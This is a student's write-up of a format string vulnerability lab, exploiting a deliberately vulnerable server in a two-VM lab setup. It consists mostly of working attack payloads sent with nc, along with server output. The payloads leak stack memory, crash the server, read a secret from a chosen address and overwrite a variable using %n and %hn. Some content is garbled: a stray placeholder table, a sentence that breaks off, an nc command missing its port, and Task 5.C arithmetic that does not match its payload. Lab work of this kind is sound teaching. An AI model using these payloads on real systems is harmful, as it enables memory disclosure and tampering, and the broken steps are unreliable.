---
title:  Format String Vulnerability Lab 
author: Xinyi Li
date: \today{}
---

# Task 1

Use the default `DUMMY_SIZE` as 100.

```bash
gcc -z execstack -o server server.c
```

Then clone the current VM according to [this manual](https://seedsecuritylabs.org/Labs_16.04/Documents/SEEDVM_VirtualBoxManual.pdf) as the server, whose IP address is `10.0.2.4`. While the client VM has an IP address as `10.0.2.15`.


On the server VM run

```bash
sudo ./server
```
Immediately, it is blocked with
```
The address of the input array: 0xbffff0e0
The address of the secret: 0x08048870
The address of the 'target' variable: 0x0804a044
The value of the 'target' variable (before): 0x11223344
```


On the client VM run

```bash
echo hello | nc -u 10.0.2.4 9090
```

And the server VM prints:
```
The ebp value inside myprintf() is: 0xbfffee28
hello
The value of the 'target' variable (after): 0x11223344
```

```
The ebp value inside myprintf() is: 0xbffff038
hello
The value of the 'target' variable (after): 0x11223344
```

# Task 2

```bash
python -c 'print "AAAA"+"%08X."*80' > badfile
nc -u 10.0.2.4 9090 < badfile
```
Then on the server:
```
The ebp value inside myprintf() is: 0xbffff038
AAAA00000000.00000064.B7FFF918.0804A014.B7FE97A2.B7FFFAD0.BFFFF0E0.00000001.BFFFF038.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.E0B1EB00.00000003.BFFFF0E0.BFFFF6C8.080487E5.BFFFF0E0.BFFFF054.00000010.08048704.00000000.00000010.00000003.82230002.00000000.00000000.00000000.9F810002.0F02000A.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.00000000.41414141.
The value of the 'target' variable (after): 0x11223344
```

`A` is `0x41`. So the distance can be considered as 80. 

Column A | 0 1 2 3 | 4 5 6 7 | 8 9 A B | C D E F
---------|----------|---------
 A1 | B1 | C1
 A2 | B2 | C2
 A3 | B3 | C3

1. 0xbffff0e0
2. 0xbffff038
3. 0xbffff0e0 + 80

The offset is 
# Task 3

send any illegal format string to the server. the server will crash.

For instance,

```bash
echo %s%s%s | nc -u 10.0.2.4 9090
```

The server will print an error message (`Segmentation fault`) and exit.

# Task 4

## Task 4 A

```
python -c 'print "%9$8x"' > badfile
nc -u 10.0.2.4  < badfile
```

```
The ebp value inside myprintf() is: 0xbffff038
bffff038
The value of the 'target' variable (after): 0x11223344
```
`bffff038` is the address of `ebp` in `myprintf`.

## Task 4 B

```bash
python -c 'print "\x70\x88\x04\x08%80$s"' > badfile
nc -u 10.0.2.4 9090 < badfile
```

And the server gives info:

```
The ebp value inside myprintf() is: 0xbffff038
... secret message
The value of the 'target' variable (after): 0x11223344
```

# Task 5

## Task 5.A

```
python -c 'print "\x44\xa0\x04\x08%80$n"' > badfile
nc -u 10.0.2.4 9090 < badfile
```

```
The ebp value inside myprintf() is: 0xbffff038
...
The value of the 'target' variable (after): 0x00000004
```

## Task 5.B

0x500 - 0x4 = 0x4FC = 1276
```
python -c 'print "\x44\xa0\x04\x08%1276x%80$n"' > badfile
nc -u 10.0.2.4 9090 < badfile
```

```
The ebp value inside myprintf() is: 0xbffff038
...
0
The value of the 'target' variable (after): 0x00000500
```

# Task 5.C

0x0000 = 0x10000
0x10000 - 0x8 = 0xFFF8 = 65528
0xFF99 - 0x10000 = 0x1FF99 - 0x10000 = 0xFF99 = 65433

```
python -c 'print "\x44\xa0\x04\x08\x46\xa0\x04\x08%65425x%80$hn%103x%80$hn"' > badfile
nc -u 10.0.2.4 9090 < badfile
```

![](./ff9900.png)

0xbffff038
```
python -c 'print "\x42\xf0\xff\xbf%80$n"' > badfile
nc -u 10.0.2.4 9090 < badfile
```